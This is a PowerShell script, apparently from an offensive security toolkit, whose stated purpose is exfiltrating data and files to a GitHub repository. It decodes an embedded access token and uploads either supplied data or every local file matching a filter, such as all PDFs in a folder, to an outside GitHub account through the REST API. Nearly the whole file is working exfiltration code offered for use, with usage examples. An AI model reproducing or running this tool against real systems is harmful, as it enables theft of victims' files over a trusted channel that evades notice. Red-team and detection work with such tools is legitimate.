function Invoke-ExfilDataToGitHub_GH
{

<#

.SYNOPSIS 
Use this script to exfiltrate data and files to a GitHub account. 
Using GitHub v3 API tutorial here 
https://channel9.msdn.com/Blogs/trevor-powershell/Automating-the-GitHub-REST-API-Using-PowerShell


.DESCRIPTION

.PARAMETER GHUser
GitHub Username

.PARAMETER GHRepo
GitHub repository

.PARAMETER GHPAT
GitHub Personal Access Token

.PARAMETER GHFilePath
GitHub filepath not including the filename so eg. testfolder/

.PARAMETER LocalFilePath
Local file path of files to upload

.PARAMETER GHFileName
GitHub filename eg. testfile.txt

.PARAMETER Filter
Local file filter eg. *.* to get all files or *.pdf for all pdfs

.PARAMETER Data
Data to write to file



.EXAMPLE
# This example exfiltrates data to a file

Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0Y==" 
                                                -GHFilePath "testfolder/" -GHFileName "testfile3" -data "a bit of test data"
.EXAMPLE
# This example exfiltrates files from a given directory and filter
Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0Y=="
   -GHFilePath "testfolder/" -LocalfilePath "C:\temp\" -Filter "*.pdf"

#>

    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $GHUser = "nnh100",

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $GHRepo = "exfil",

        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $GHPAT = "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0Y==", # This should be base 64 encoded

        [Parameter(Position =3, Mandatory = $True)]
        [String]
        $GHFilePath = "testfolder2/",

        [Parameter(Position = 4, Mandatory=$True, ParameterSetName="ExfilFilesFromFilePath")]
        [String]
        $LocalFilePath = "C:\temp\",

        [Parameter(Position = 4, Mandatory = $True, ParameterSetName="ExfilDataToFile")]
        [String]
        $GHFileName = "testfile1",

        [Parameter(Position = 5, Mandatory = $True, ParameterSetName="ExfilFilesFromFilePath")]
        [String]
        $Filter = "*.*",

        [Parameter(Position = 5, Mandatory = $True, ParameterSetName="ExfilDataToFile")]
        [Object]
        $Data = "test data"

        #[switch]
        #$Filter = $False


    )


    # Decode the GitHub Personal Access Token
    $GHPAT = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($GHPAT))

    # Get the PAT in the correct format
    $Token = $GHUser + ":" + $GHPAT

    # Convert this to Base64
    $Base64Token = [System.Convert]::ToBase64String([char[]]$Token)
    $Headers = @{
        Authorization =  'Basic {0}' -f $Base64Token;
    };



#region ExfilDataToFile

if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
{

    # Before deleting or inserting check to see if the file exists, if it does then get the sha and delete the file first
    $GHAPI = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $GHFilePath + $GHFileName

    $Body = @{
        path = $GHFilePath + $GHFileName;
        ref = "master";
    }


    Try {
        $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Get -ErrorAction Stop
         # If we get here that means we were able to get the contents so get hold of the sha
        $sha = $content.sha
        #Write-Host $sha
    }
    Catch {        
        $ErrorMessage = $_.Exception.Message;
        Write-Host "Trying to get file contents: " + $ErrorMessage; # remove in production
    }

   

    # Delete the file if it already exists
    if ($sha -ne $null){
    

        $Body = @{
            path = $GHFileName;
            message = "deleted file";
            sha = $sha;
    
        } | ConvertTo-Json;

        try {
            Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Delete -ErrorAction Stop
        }
        catch{
            $ErrorMessage = $_.Exception.Message;
            Write-Host "Trying to delete file: " + $ErrorMessage; #remove in production
        }
    } 

    # Here we are adding the file
    $Body = @{
        path = $GHFileName;
        content = [System.Convert]::ToBase64String([char[]]$Data);
        encoding = 'base64';
        message = "Commit at: " + (Get-Date); 
        } | ConvertTo-Json;
       
        try{            
            $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction Stop
            Write-Host "Successfully uploaded file!"
        }
        catch{
            $ErrorMessage = $_.Exception.Message;
            Write-Host "Trying to create file: " + $ErrorMessage;
            exit
        }    


    
}



#endregion


#region ExfilFilesFromFilePath


if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
{


    $files  = Get-Item ($LocalFilePath + $Filter)
    #write-host $files

    ForEach ($file in $Files){

        Try {
            
            # Construct the API URL
            $GHAPI = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $GHFilePath + $file.Name

            
            # Check to see if the file already exists
            $Body = @{
                path = $GHFilePath + $file.Name;
                ref = "master";
            }

            Try {
                $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Get -ErrorAction Stop
                # If we get here that means we were able to get the contents so get hold of the sha
                $sha = $content.sha
            }
            Catch {      
                $ErrorMessage = $_.Exception.Message;
                Write-Host "Trying to get file contents: " + $ErrorMessage;
            }

            # Delete the file if it already exists
            if ($sha -ne $null){
    
                $Body = @{
                    path = $file.Name;
                    message = "deleted file";
                    sha = $sha;    
                } | ConvertTo-Json;

                try {
                    Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Delete -ErrorAction Stop
                }
                catch{
                    $ErrorMessage = $_.Exception.Message;
                    Write-Host "Trying to delete file: " + $ErrorMessage;
                }
            } 

            # Upload the file
            # Get the file as a byte array
            $FileBytes = Get-Content -Path $file.FullName -Encoding Byte
            # Base 64 encode the byte array
            $Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes)
            
            # Set the body context for GitHub
            $Body = @{
                path = $file.Name
                content = $Base64EncodedFileBytes;                
                encoding = 'base64'
                message = "Commit at: " + (Get-Date);
            } | ConvertTo-Json
            
            $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction Stop
            Write-Host "Successfully uploaded file!"

        }
        Catch {
            $ErrorMessage = $_.Exception.Message;
            Write-Host "Trying to upload file " + $file.FullName + " :" + $ErrorMessage
            exit
        }

    }
   
}

#endregion

}



#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0Y==" -GHFilePath "testfolder/" -LocalfilePath "C:\temp\" -Filter "*.*"

#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0Y==" -GHFilePath "testfolder/" -GHFileName "myfile.txt" -data "a bit of test data"
